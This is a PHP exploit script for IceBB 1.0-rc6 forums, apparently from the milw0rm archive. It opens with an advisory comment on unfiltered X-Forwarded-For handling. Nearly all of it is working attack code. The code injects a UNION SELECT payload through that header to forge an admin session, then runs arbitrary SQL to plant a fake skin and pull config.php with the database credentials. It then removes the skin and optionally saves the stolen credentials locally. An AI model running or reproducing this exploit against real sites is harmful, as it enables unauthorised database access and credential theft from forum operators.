<?php
/*---------------------------------------------------------*\
IceBB 1.0-rc6 - Database Authentication Details Exploit

[|Description:|]
A security breach has been discoverd in IceBB 1.0-rc6.
This breach is caused by a bad filtering of the X-Forwarded-For variable:

> ./includes/functions.php, line 73
$ip	 = empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['REMOTE_ADDR'] : $_SERVER['HTTP_X_FORWARDED_FOR'];
$ip	= $this->clean_key($ip);
$input['ICEBB_USER_IP']	= $ip;

> ./icebb.php, line 169
$icebb->client_ip	= $input['ICEBB_USER_IP'];

> ./admin/index.php, line 112
$icebb->adsess	= $db->fetch_result("SELECT adsess.*,u.id as userid,u.username,u.temp_ban,g.g_view_board FROM icebb_adsess AS adsess LEFT JOIN icebb_users AS u ON u.username=adsess.user LEFT JOIN icebb_groups AS g ON u.user_group=g.gid WHERE adsess.asid='{$icebb->input['s']}' AND adsess.ip='{$icebb->client_ip}' LIMIT 1");

A hacker could exploit this security breach in order to alter a SQL request.

[|Advisory:|]
http://www.aeroxteam.fr/advisory-IceBB-1.0rc6.txt

[|Solution:|]
No one. Think about update your forum core when a patch will be available on the official website.

Discovered by Gu1ll4um3r0m41n (aeroxteam --[at]-- gmail --[dot]-- com)
for AeroX (AeroXteam.fr)
(C)opyleft 2007
Greetz: MathÂ², KERNEL_ERROR, NeoMorphS, Snake91, Goundy, Alkino (...) And everybody from #aerox
\*---------------------------------------------------------*/

if(count($argv) == 4) {
	head();
	if($argv[3] != 1 && $argv[3] != 2) {
		die("\r\nIncorrect version !");
	} else {
		$version = $argv[3];
	}
	
	
	############## PART 1 ##############
	echo "[+] Connecting... ";
	$sock = fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die("Failed\r\n\r\nCould not connect to ".$argv[1]." on the port 80 !");
	}
	echo "OK\r\n";
	echo "[+] Getting tables prefix... ";
	$query1  = "GET ".$argv[2]."index.php?s=fake_sid&act=sql HTTP/1.1\r\n";
	$query1 .= "Host: ".$argv[1]."\r\n";
	$query1 .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9\r\n";
	$query1 .= "X-Forwarded-For: ".getInj()."\r\n";
	$query1 .= "Accept: */*\r\n";
	$query1 .= "Connection: Close\r\n\r\n";
	fwrite($sock, $query1);
	$result1 = '';
	while(!feof($sock)) {
		$result1 .= fgets($sock);
	}
	fclose($sock);
	if(preg_match("`<tr><td class='row2'><a href='index\.php\?s=my_sessid&act=sql&amp;table=(.*?)adsess'>`", $result1, $expreg)) {
		if($expreg[1] == '') {
			echo "Failed\r\n\r\nExploit Failed :(";
			die();
		}
		$prefix = $expreg[1];
		echo "OK (".$expreg[1].")\r\n";
	} else {
		echo "Failed\r\n\r\nExploit Failed :(";
		die();
	}
	
	############## PART 2 ##############
	echo "[+] Creating fake skin... ";
	$sock = fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die("Failed\r\n\r\nCould not connect to ".$argv[1]." on the port 80 !");
	}
	$postdata2 = "act=sql&func=runquery&query=INSERT+INTO+%60".$prefix."skins%60+%28%60skin_id%60%2C+%60skin_name%60%2C+%60skin_author%60%2C+%60skin_site%60%2C+%60skin_folder%60%2C+%60skin_preview%60%2C+%60skin_is_default%60%2C+%60skin_is_hidden%60%2C+%60skin_wrapper%60%2C+%60skin_macro_cache%60%2C+%60smiley_set%60%29+VALUES+%28666%2C+0x6F776E4564%2C+0x6834783072%2C+0x687474703A2F2F7777772E676F6F676C652E6672%2C+0x2E2E%2C+0x00%2C+0%2C+1%2C+0x00%2C+0x00%2C+0x00%29%3B";
	$query2  = "POST ".$argv[2]."index.php?s=fake_sid HTTP/1.1\r\n";
	$query2 .= "Host: ".$argv[1]."\r\n";
	$query2 .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9\r\n";
	$query2 .= "X-Forwarded-For: ".getInj()."\r\n";
	$query2 .= "Accept: */*\r\n";
	$query2 .= "Connection: Close\r\n";
	$query2 .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$query2 .= "Content-Length: ".strlen($postdata2)."\r\n\r\n";
	$query2 .= $postdata2;
	fwrite($sock, $query2);
	$result2 = '';
	while(!feof($sock)) {
		$result2 .= fgets($sock);
	}
	fclose($sock);
	if(strpos($result2, "<textarea name='query' rows='5' cols='50'>INSERT INTO `".$prefix."skins` (`skin_id`, `skin_name`, `skin_author`, `skin_site`, `skin_folder`, `skin_preview`, `skin_is_default`, `skin_is_hidden`, `skin_wrapper`, `skin_macro_cache`, `smiley_set`) VALUES (666, 0x6F776E4564, 0x6834783072, 0x687474703A2F2F7777772E676F6F676C652E6672, 0x2E2E, 0x00, 0, 1, 0x00, 0x00, 0x00);&lt;/textarea&gt;") === FALSE) {
		echo "Failed. Maybe Skin already exists ?\r\n";
	} else {
		echo "OK\r\n";
	}
	
	
	############## PART 3 ##############
	echo "[+] Getting config.php... ";
	$sock = fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die("Failed\r\n\r\nCould not connect to ".$argv[1]." on the port 80 !");
	}
	$query3  = "GET ".$argv[2]."index.php?s=fake_sid&act=skins&func=templates&skinid=666&code=edit&template=config HTTP/1.1\r\n";
	$query3 .= "Host: ".$argv[1]."\r\n";
	$query3 .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9\r\n";
	$query3 .= "X-Forwarded-For: ".getInj()."\r\n";
	$query3 .= "Accept: */*\r\n";
	$query3 .= "Connection: Close\r\n\r\n";
	fwrite($sock, $query3);
	$result3 = '';
	while(!feof($sock)) {
		$result3 .= fgets($sock);
	}
	fclose($sock);
	if(preg_match("`(<\?php.*\?>)`s", $result3, $expreg2)) {
		echo "OK\r\n\r\n";
		echo $expreg2[1];
	} else {
		echo "Failed\r\n\r\nExploit Failed :(";
	}
	
	
	############## PART 4 ##############
	echo "\r\n\r\n[+] Removing fake skin... ";
	$sock = fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die("Failed\r\n\r\nCould not connect to ".$argv[1]." on the port 80 !");
	}
	$query4  = "GET ".$argv[2]."index.php?s=fake_sid&act=skins&func=disable&skinid=666 HTTP/1.1\r\n";
	$query4 .= "Host: ".$argv[1]."\r\n";
	$query4 .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9\r\n";
	$query4 .= "X-Forwarded-For: ".getInj()."\r\n";
	$query4 .= "Accept: */*\r\n";
	$query4 .= "Connection: Close\r\n\r\n";
	fwrite($sock, $query4);
	fclose($sock);
	echo "OK\r\n\r\n";
	echo "Do you want to create a local config.php file ? (Y/N) ";
	$a = strtoupper(trim(fgets(STDIN)));
	if($a == 'Y') {
		$handle = fopen('config_'.$argv[1].'_'.time().'.php', 'w');
		fwrite($handle, $expreg2[1]);
		fclose($handle);
	}
	
} else {
	usage();
}
function getInj() {
	global $version;
	if($version == 1) {
		return "' AND 1=2 UNION SELECT 'my_sessid' as asid, 'lol' as user, '127.0.0.1' as ip, ".(time() - 60)." as logintime, 'home' as location, ".(time() - 55)." as last_action, 1 as userid, 'lol' as username /*";
	} elseif($version == 2) {
		return "' AND 1=2 UNION SELECT 'my_sessid' as asid, 'lol' as user, '127.0.0.1' as ip, ".(time() - 60)." as logintime, 'home' as location, ".(time() - 55)." as last_action, 1 as userid, 'lol' as username, 0 as temp_ban, 1 as g_view_board /*";
	}
}
function usage() {
	echo "+-------------------------------------------------------+\r\n";
	echo "|   IceBB <= 1.0-rc6 Database Authentication Details    |\r\n";
	echo "|             By Gu1ll4um3r0m41n for AeroX              |\r\n";
	echo "| Usage: php exploit.php site.com /pathtoadmin/ version |\r\n";
	echo "|                Version:   1 = rc5                     |\r\n";
	echo "|                           2 = rc6                     |\r\n";
	echo "+-------------------------------------------------------+\r\n";
}
function head() {
	echo "+--------------------------------------------------+\r\n";
	echo "| IceBB <= 1.0-rc6 Database Authentication Details |\r\n";
	echo "|           By Gu1ll4um3r0m41n for AeroX           |\r\n";
	echo "+--------------------------------------------------+\r\n\r\n";
}
?>

# milw0rm.com [2007-11-18]
